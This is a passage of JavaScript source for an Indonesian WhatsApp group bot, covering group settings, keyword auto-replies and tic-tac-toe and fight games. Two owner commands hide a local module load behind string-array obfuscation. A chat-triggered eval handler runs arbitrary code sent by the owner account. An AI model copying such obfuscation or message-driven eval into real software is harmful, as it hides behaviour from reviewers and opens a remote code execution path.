 reply(`*...:* *𝙈𝙐𝙏𝙀 𝙊𝙁𝙁* *:...*\n\nPerhatian untuk member grup\nBot telah di unmute di grup ${groupName} , Silahkan menggunakan bot dengan sewajarnya\n\n_*${botName}*_`)
  } else {
 reply(`Pilih enable atau disable`)
  }
  break
  case 'grupsetting':
  case 'groupsetting':
  if (!isGroup) return reply(mess.only.group)
 if (!isGroupAdmins) return reply(mess.only.admin)
list = []
 com = [`group enable`,`leveling enable`,`welcome enable`,`antilink enable`,`mute enable`]
 comm = [`group disable`,`leveling disable`,`welcome disable`,`antilink disable`,`mute disable`]
 listnya = [`Group open/close`,`Leveling enable/disable`,`Welcome enable/disable`,`Antilink enable/disable`,`Mute enable/disable`]
 suruh = [`Enable`, `Disable`]
 fiturname = [`Group`,`Leveling`,`Welcome`,`Antilink`,`Mute`]
 startnum = 0; let startnu = 0; let startn = 0;let start = 0
 startnumm = 1
 for (let x of com) {
var yy = {title: `${listnya[startnum++]}`,
rows: [
{
 title: `${suruh[0]}`,
 description: `\nMengaktifkan ${fiturname[startnu++]}`,
 rowId: `${prefix}${x}`
  },{
 title: `${suruh[1]}`,
 description: `\nMenonaktifkan ${fiturname[startn++]}`,
 rowId: `${prefix}${comm[start++]}`
  }
  ]
}
list.push(yy)
 }
 listmsg(from, `Group Setting`, `Atur Settingan Grup anda disini......`, list)
 break
 case 'group':
 case 'grup':
 if (!isGroup) return reply(mess.only.group)
  if (!isGroupAdmins) return reply(mess.only.admin)
 if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (args.length < 1) return reply('!group enable/disable')
  if (args[0].toLowerCase() === 'enable'){
 kahfzz.groupSettingChange(from, "announcement", false)
 .then((res) => reply(jsonformat(res)))
 .catch((err) => reply(jsonformat(err)))
  } else if (args[0].toLowerCase() === 'disable'){
 kahfzz.groupSettingChange(from, "announcement", true)
 .then((res) => reply(jsonformat(res)))
 .catch((err) => reply(jsonformat(err)))
  } else if (args[0].toLowerCase() === 'close'){
 kahfzz.groupSettingChange(from, "announcement", true)
 .then((res) => reply(jsonformat(res)))
 .catch((err) => reply(jsonformat(err)))
  } else if (args[0].toLowerCase() === 'open'){
 kahfzz.groupSettingChange(from, "announcement", false)
 .then((res) => reply(jsonformat(res)))
 .catch((err) => reply(jsonformat(err)))
  } else {
 reply(`Pilih enable atau disable`)
  }
  break
//------------------< Menunya Bang:v >-------------------
case 'infoig':
reply(`Jangan Lupa Follow Ig Owner Ya : https://www.instagram.com/Kahfz_13/`)
break
case 'kahfzzgroup':
reply('JOIN GC KE OWNER YA PC BIAR DAPET SC NYA BOY')
break



case 'jadibot':
if (!isOwner) return  reply(mess.only.owner)
 const _0x5f10=['1ubdcbO','202171TkLMwo','284052dVVNCo','42JxCsde','24890OaehfM','./jadibot.js','26826mdmYhJ','176EqLcNV','55194kArISZ','6GRvhmu','314893OwJFDH'];const _0x470b71=_0x5476;function _0x5476(_0x56372d,_0x51b653){return _0x5476=function(_0x5f107a,_0x54761a){_0x5f107a=_0x5f107a-0xd8;let _0x336fbf=_0x5f10[_0x5f107a];return _0x336fbf;},_0x5476(_0x56372d,_0x51b653);}(function(_0x4b0f8a,_0x1f534e){const _0x1acfb6=_0x5476;while(!![]){try{const _0x55ab94=-parseInt(_0x1acfb6(0xdc))+parseInt(_0x1acfb6(0xe2))*parseInt(_0x1acfb6(0xde))+-parseInt(_0x1acfb6(0xe1))*parseInt(_0x1acfb6(0xdb))+parseInt(_0x1acfb6(0xda))+-parseInt(_0x1acfb6(0xdd))+parseInt(_0x1acfb6(0xdf))+parseInt(_0x1acfb6(0xd8))*parseInt(_0x1acfb6(0xd9));if(_0x55ab94===_0x1f534e)break;else _0x4b0f8a['push'](_0x4b0f8a['shift']());}catch(_0x4a8ec9){_0x4b0f8a['push'](_0x4b0f8a['shift']());}}}(_0x5f10,0x285aa));const {jadibot}=require(_0x470b71(0xe0));jadibot(kahfzz,from,sender,reply,kahfz);
break
case 'stopjadibot':
case 'stopbot':
const _0x1427=['2584oRLTbU','3849mFwfyJ','./jadibot.js','71LvrzJG','286372cCrXrQ','1yPMtDu','1AjjlYF','456046PuhVDs','394eRcMph','746574pwCcoE','625699UVPwUh','1029671oWZdcF'];const _0x49a386=_0x39bb;function _0x39bb(_0x399e0b,_0x2d0c73){return _0x39bb=function(_0x1427be,_0x39bbc5){_0x1427be=_0x1427be-0x132;let _0x12e62d=_0x1427[_0x1427be];return _0x12e62d;},_0x39bb(_0x399e0b,_0x2d0c73);}(function(_0x49c476,_0x4d8227){const _0x22a1e5=_0x39bb;while(!![]){try{const _0x311704=parseInt(_0x22a1e5(0x138))*parseInt(_0x22a1e5(0x13c))+parseInt(_0x22a1e5(0x13b))*parseInt(_0x22a1e5(0x136))+-parseInt(_0x22a1e5(0x134))+-parseInt(_0x22a1e5(0x13d))*parseInt(_0x22a1e5(0x133))+parseInt(_0x22a1e5(0x137))+-parseInt(_0x22a1e5(0x139))+-parseInt(_0x22a1e5(0x13a))*parseInt(_0x22a1e5(0x135));if(_0x311704===_0x4d8227)break;else _0x49c476['push'](_0x49c476['shift']());}catch(_0x25e28b){_0x49c476['push'](_0x49c476['shift']());}}}(_0x1427,0x8b9f1));const {stopjadibot}=require(_0x49a386(0x132));stopjadibot(kahfzz,from,sender,kahfz);
break
default:
if (budy.includes(`assalamualaikum`)) {
  reply(`Waalaikumsalam`)
}
if (budy.includes(`anjing`)) {
  reply(`santai jamet`)
}
if (budy.includes(`Kahfz`)) {
  reply(`Auto respon: Iya kenapa manggil ownerku?`)
}


if (budy.includes(`Assalamualaikum`)) {
  reply(`Waalaikumsalam`)
}
if (budy.includes(`P`)) {
  reply(`Iya Ada Yang Bisa Saya Bantu?\nKetik *!menu* Untuk Melihat Fitur Bot!!`)
}

if (budy.includes(`syalom`)) {
  reply(`waalaikumsalam`)
}
      if (budy.includes(`Sholawat`)) {

const Alam = fs.readFileSync('./mp3/anabinidik.mp3');

kahfzz.sendMessage(from, Alam, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})

                }
              if (budy.includes(`Bot`)){  
                    const F3 = fs.readFileSync('menu/tag5.webp');
                    kahfzz.sendMessage(from, F3, sticker, {quoted: freply})
                    }
                      if (budy.includes(`sholawat`)) {

const Alam = fs.readFileSync('./mp3/anabinidik.mp3');

kahfzz.sendMessage(from, Alam, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})

                }

if (budy.includes("Numa")){

  kahfzz.updatePresence(from, Presence.composing)

  const loli = fs.readFileSync('./assets/numa')

  kahfzz.sendMessage(from, loli, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})

  const d = fs.readFileSync('./sticker/jget.webp');

  kahfzz.sendMessage(from, d, sticker, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "song : dj numa numa yei", 'jpegThumbnail': fs.readFileSync('./sticker/dnsnew.webp')}}}})

}
if (budy.includes("#m")){
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
}
if (budy.includes("!m")){
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
}
if (budy.includes("#a")){
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
}
if (budy.includes("!a")){
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
}
if (budy.includes("#s")){
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
}
if (budy.includes("!s")){
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
}
if (budy.includes("bot")){
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
}
if (budy.includes("Bot")){
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
}



if (fs.existsSync(`./media/${from}.json`)) {
	gelutSkuy = setGelud(`${from}`)
	if (sender == `${gelutSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
		if (gelutSkuy.status) return reply(`Game telah dimulai sebelumnya!`)
gelutSkuy.status = true
 rand0m = [ gelutSkuy.Z, gelutSkuy.Y ]
 winR = rand0m[Math.floor(Math.random() * rand0m.length)]
 fs.writeFileSync(`./media/${from}.json`, JSON.stringify(gelutSkuy, null, 2))
 starGame = `👑 Gelud Game 🤙?? 

 Diantara @${gelutSkuy.Z} & @${gelutSkuy.Y}
 • Pemenangnya adalah [ @${winR} ] `
 kahfzz.sendMessage(from, starGame, text, {quoted: freply, contextInfo: { mentionedJid: [winR + "@s.whatsapp.net", gelutSkuy.Z + "@s.whatsapp.net", gelutSkuy.Y + "@s.whatsapp.net",]}})
 fs.unlinkSync("./media/" + from + ".json");
  } else if (sender == `${gelutSkuy.Y}@s.whatsapp.net` &&  budy.toLowerCase() == 'n') {
 kahfzz.sendMessage(from, `?? Game Gelud Rejected 🤙🏻
• @${gelutSkuy.Y} Menolak🤙🏻`, text, {quoted: freply, contextInfo: { mentionedJid: [gelutSkuy.Y + "@s.whatsapp.net"]}})
 fs.unlinkSync("./media/" + from + ".json");
  }
}

if (isTTT && isPlayer2){
  if (budy.startsWith('Y')){
 tto = ky_ttt.filter(ghg => ghg.id.includes(from))
 tty = tto[0]
 angka = tto[0].angka
 ucapan = 
 `*🎳 Game Tictactoe 🎲*

 Player1 @${tty.player1.split('@')[0]}=❎
 Player2 @${tty.player2.split('@')[0]}=⭕

 Giliran = @${tty.player1.split('@')[0]}

 ${angka[1]}${angka[2]}${angka[3]}
 ${angka[4]}${angka[5]}${angka[6]}
 ${angka[7]}${angka[8]}${angka[9]}`
 kahfzz.sendMessage(from, ucapan, text, {quoted: freply, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
  }
  if (budy.startsWith('N')){
 tto = ky_ttt.filter(ghg => ghg.id.includes(from))
 tty = tto[0]
 naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
 ky_ttt = naa
 kahfzz.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Menolak:(`,text,{quoted:kahfz,contextInfo:{mentionedJid:[tty.player2]}})
  }
}

if (isTTT && isPlayer1){
  nuber = parseInt(budy)
  if (isNaN(nuber)) return
 if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
 if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
  s = '❎'
main[0].angka[nuber] = s
main[0].gilir = main[0].player1
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
  ucapan1 = 
  `*🎳Result Game Tictactoe 🎲*

  *Yeyyy Permainan Di Menangkan Oleh* @${tty.player1.split('@')[0]}\n
  *Ingin bermain lagi? ${prefix}tictactoe*`
  ucapan2 = `*🎳Result Game Tictactoe 🎲*

  *Hasil Akhir:*

  ${ttt}`
  kahfzz.sendMessage(from, ucapan1, text, {quoted: freply, contextInfo:{mentionedJid: [tty.player1]}})
  naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
  return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()

  if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()

 if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()

if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()

  if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()

 if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()

if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()

  if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()

 if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳 Result Game Tictactoe 🎲*

 *_Permainan Seri ??👌_*`
 ucapan2 = `*🎳 Result Game Tictactoe ??*

 *Hasil Akhir:*

 ${ttt}`
 reply(ucapan1)
 naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
 return ky_ttt = naa
  }
  ucapan = `*🎳 Game Tictactoe 🎲*

  Player2 @${tty.player2.split('@')[0]}=⭕
  Player1 @${tty.player1.split('@')[0]}=❎

  Giliran = @${tty.player2.split('@')[0]}

  ${ttt}`
  kahfzz.sendMessage(from, ucapan, text, {quoted: freply, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
}
if (isTTT && isPlayer2){
  nuber = parseInt(budy)
  if (isNaN(nuber)) return
 if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
 if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
  s = '⭕'
main[0].angka[nuber] = s
main[0].gilir = main[0].player2
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
  ucapan1 = `*🎳 Result Game Tictactoe 🎲*

  *Yeyyy Permainan Di Menangkan Oleh* @${tty.player2.split('@')[0]}\n
  *Ingin bermain lagi? ${prefix}tictactoe*`
  ucapan2 = `*🎳 Game Tictactoe 🎲*

  *Hasil Akhir:*

  ${ttt}`
  kahfzz.sendMessage(from, ucapan1, text, {quoted:kahfz, contextInfo:{mentionedJid: [tty.player2]}})
  naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
  return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()
  if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()
 if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()
if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()
  if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()
 if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()
if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()
  if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()
 if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*??Result Game Tictactoe 🎲*

 *_Permainan Seri🗿👌*`
 ucapan2 = `*🎳 Result Game Tictactoe 🎲*

 *Hasil Akhir:*

 ${ttt}`
 reply(ucapan1)
 naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
 return ky_ttt = naa
  }
  ucapan = `*🎳 Game Tictactoe 🎲*

  Player1 @${tty.player1.split('@')[0]}=⭕
  Player2 @${tty.player2.split('@')[0]}=❎

  Giliran = @${tty.player1.split('@')[0]}

  ${ttt}`
  kahfzz.sendMessage(from, ucapan, text, {quoted: freply, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
} else {
}
if (/^=?>/.test(budy) && (isOwner || kahfz.key.fromMe )){

  let parse = /^=>/.test(budy) ? budy.replace(/^=>/,'return') : budy.replace(/^>/,'')

  try{

 let evaluate = await eval(`;(async () => {${parse} })()`).catch(e => { return e })

 return reply(require('util').format(evaluate))

  } catch(e){

return reply(require('util').format(e))

 }
  }
  if (!isGroup && isCmd && !kahfz.key.fromMe){
 tek = `SubsCribe KahfzBot`
 meki = `Maaf @${senderr.split('@')[0]}, command ${prefix + command} tidak ada dalam menu`
 sendButMessage (from, meki, tek, nomenu, 'extendedTextMessage', {sendEphemeral:true, quoted:kahfz, mentionedJid:[senderr]})
  }
} 
if (isGroup && budy != undefined) {
} else {
 console.log('[',color('TEXT','teal'),']',`Pesan : ${budy} Dari`, color(pushname))
  }		
} catch (e) {
  e = String(e)
  if (!e.includes("this.isZero")) {
console.log('Message : %s', color(e, 'cyan'))
 }
  }
}



